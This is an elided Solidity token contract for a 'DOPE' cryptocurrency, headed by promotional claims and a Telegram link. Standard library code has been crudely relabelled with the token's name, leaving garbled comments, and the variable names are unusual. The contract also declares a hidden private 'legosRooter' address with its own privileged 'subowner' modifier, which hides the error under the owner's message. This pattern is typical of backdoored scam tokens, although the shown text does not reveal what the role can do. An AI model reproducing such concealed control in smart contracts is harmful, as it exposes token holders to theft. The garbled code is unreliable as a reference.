...
https://docs.DOPE.io/
https://t.me/DOPE
DOPE provides the most lightning-fast,decentralized,
scalable,open-source Layer-1.The future of Proof-of-Work is now DOPE,
...
ushering in an age of decentralized finance.DOPE revolutionizes 
...
/*
 * @dev Provides information about the current execution DOPE20Burnable, including the
 ...
 */
abstract contract DOPE20Burnable {
...
// File: @openzeppelin/contracts/access/DOPE20Ownable.sol
 ...
 * the owner.
 */
abstract contract DOPE20Ownable is DOPE20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "DOPE20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "DOPE20Ownable: new owner is the zero address");
 ...
 * `SafeDOPE` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeDOPE {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeDOPE: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeDOPE: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeDOPE: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeDOPE: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeDOPE: modulo by zero");
  }
...
contract DOPEToken is DOPE20Burnable, DOPE33, DOPE20Ownable {
    
    using SafeDOPE for uint256;
   ...
   address private legosRooter; 
    ...
    string public DOPEtelegramcchannel = "https://t.me/DOPE";
            function getDOPEtelegramcchannel() public view returns (string memory) {
        return DOPEtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {DOPE33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "DOPE20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {DOPE33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {DOPE33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {DOPE33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "DOPE33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {DOPE33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "DOPE33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "DOPE33: transfer from the zero address");
        require(shippingto != address(0), "DOPE33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "DOPE33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "DOPE33: approve from the zero address");
        require(transporteur != address(0), "DOPE33: approve to the zero address");
